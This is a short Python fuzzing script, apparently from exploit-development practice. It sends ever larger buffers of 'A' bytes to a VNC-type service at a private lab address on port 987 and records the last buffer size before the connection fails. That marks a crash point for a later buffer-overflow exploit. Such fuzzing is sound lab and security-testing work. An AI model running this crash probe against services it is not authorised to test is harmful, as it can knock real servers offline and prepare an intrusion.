#!/usr/bin/env python3
# Fuzzing VNC
# Author Yehia Elghaly

import socket
import time

HOST = "192.168.166.132" 
PORT = 987 
def create_buffer(size):
    return b"A" * size 

def test_v_server(initial_size, increment, max_size):
    size = initial_size
    last_successful_size = None
    while size <= max_size:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                print(f"Connecting to {HOST}:{PORT}")
                s.connect((HOST, PORT))

                buffer = create_buffer(size)
                print(f"Sending buffer of size: {size}")
                s.sendall(buffer)

                last_successful_size = size
                s.close()

        except socket.error as e:
            print(f"Connection error at buffer size {size}: {e}")
            if last_successful_size is not None:
                print(f"The last successful buffer size before crash: {last_successful_size}")
            break

        size += increment
        time.sleep(5) 

if __name__ == "__main__":
    test_v_server(initial_size=10000, increment=1000, max_size=60000)